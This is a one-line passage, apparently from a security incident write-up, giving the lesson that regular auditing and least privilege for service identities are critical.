- **Lesson:** Regular auditing and principle of least privilege for service identities is critical

---
